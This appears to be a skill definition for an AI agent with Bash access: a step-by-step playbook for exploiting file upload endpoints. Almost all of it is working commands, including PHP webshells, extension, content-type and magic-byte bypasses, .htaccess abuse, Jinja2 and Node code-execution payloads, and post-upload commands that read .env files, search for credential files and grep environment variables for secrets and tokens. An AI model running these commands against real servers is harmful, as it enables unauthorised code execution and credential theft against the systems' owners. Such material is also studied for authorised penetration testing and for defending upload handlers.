---
name: file-upload
description: "Arbitrary file upload exploitation — webshell upload, extension bypass, content-type manipulation, and upload-to-RCE techniques."
allowed-tools: Bash Read Write
metadata:
  subdomain: execution
  when_to_use: "file upload, webshell, arbitrary upload, extension bypass, upload rce, shell upload, image upload bypass"
  tags: web-application, file-upload, webshell, rce
  mitre_attack: T1190, T1505.003
---

# Arbitrary File Upload Exploitation

Exploits insufficient file upload validation to upload executable files (webshells) achieving RCE on the target server. Common in image/document upload features, profile picture handlers, and file import endpoints.

## Discovery
```bash
# Find upload endpoints
curl -s 'http://<TARGET>/' | grep -i 'upload\|file\|enctype="multipart\|type="file"'
curl -s 'http://<TARGET>/upload'
curl -s 'http://<TARGET>/api/upload'

# Check for upload directory listing
curl -s 'http://<TARGET>/uploads/'
curl -s 'http://<TARGET>/static/'
curl -s 'http://<TARGET>/files/'
curl -s 'http://<TARGET>/media/'
```

## PHP Webshell Upload
```bash
# Create webshell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Standard upload
curl -s 'http://<TARGET>/upload' -F 'file=@shell.php'

# After upload — find and execute
for dir in uploads static files media images upload; do
  resp=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>/$dir/shell.php?cmd=id")
  [ "$resp" = "200" ] && echo "Found at /$dir/shell.php" && curl -s "http://<TARGET>/$dir/shell.php?cmd=cat+/.env"
done
```

## Extension Bypass Techniques
```bash
# Alternative PHP extensions
for ext in php php3 php4 php5 phtml pht phps php7 phar; do
  echo "<?php system(\$_GET['cmd']); ?>" > "shell.$ext"
  curl -s 'http://<TARGET>/upload' -F "file=@shell.$ext" && echo " -> $ext uploaded"
done

# Double extension (Apache may parse .php in the middle)
echo '<?php system($_GET["cmd"]); ?>' > shell.php.jpg
curl -s 'http://<TARGET>/upload' -F 'file=@shell.php.jpg'

# Trailing characters
echo '<?php system($_GET["cmd"]); ?>' > 'shell.php.'
curl -s 'http://<TARGET>/upload' -F 'file=@shell.php.'
echo '<?php system($_GET["cmd"]); ?>' > 'shell.php;.jpg'

# Case variation
echo '<?php system($_GET["cmd"]); ?>' > shell.pHp
curl -s 'http://<TARGET>/upload' -F 'file=@shell.pHp'

# Null byte in filename (older systems)
curl -s 'http://<TARGET>/upload' -F 'file=@shell.php;filename="shell.php%00.jpg"'
```

## Content-Type Bypass
```bash
# Override Content-Type header to claim image
curl -s 'http://<TARGET>/upload' -F 'file=@shell.php;type=image/jpeg'
curl -s 'http://<TARGET>/upload' -F 'file=@shell.php;type=image/png'
curl -s 'http://<TARGET>/upload' -F 'file=@shell.php;type=image/gif'

# Add image magic bytes + PHP
printf '\x89PNG\r\n\x1a\n<?php system($_GET["cmd"]); ?>' > shell.php
curl -s 'http://<TARGET>/upload' -F 'file=@shell.php;type=image/png'

# GIF magic bytes
printf 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.gif.php
curl -s 'http://<TARGET>/upload' -F 'file=@shell.gif.php'
```

## .htaccess Upload (Apache)
```bash
# Upload .htaccess to make .jpg executable as PHP
echo 'AddType application/x-httpd-php .jpg' > .htaccess
curl -s 'http://<TARGET>/upload' -F 'file=@.htaccess'

# Then upload PHP code as .jpg
echo '<?php system($_GET["cmd"]); ?>' > shell.jpg
curl -s 'http://<TARGET>/upload' -F 'file=@shell.jpg'
curl -s 'http://<TARGET>/uploads/shell.jpg?cmd=cat+/.env'
```

## Python/Node Targets
```bash
# Python — if Jinja2/Flask evaluates uploaded templates
echo '{{ config.__class__.__init__.__globals__["os"].popen("cat /.env").read() }}' > shell.html
curl -s 'http://<TARGET>/upload' -F 'file=@shell.html'

# Node — if uploaded files are required/imported
echo 'require("child_process").execSync("cat /.env")' > shell.js
curl -s 'http://<TARGET>/upload' -F 'file=@shell.js'
```

## Post-Upload Credential/Secret Extraction
```bash
# After successful upload, execute commands to locate sensitive files
curl -s 'http://<TARGET>/uploads/shell.php?cmd=cat+/.env'
curl -s 'http://<TARGET>/uploads/shell.php?cmd=ls+-la+/'
curl -s 'http://<TARGET>/uploads/shell.php?cmd=find+/+-type+f+\(-name+"*.env"+-o+-name+"config*"+-o+-name+"secret*"+-o+-name+"cred*"\)+2>/dev/null'
curl -s 'http://<TARGET>/uploads/shell.php?cmd=printenv+|+grep+-iE+"secret|key|token|pass|cred"'
```
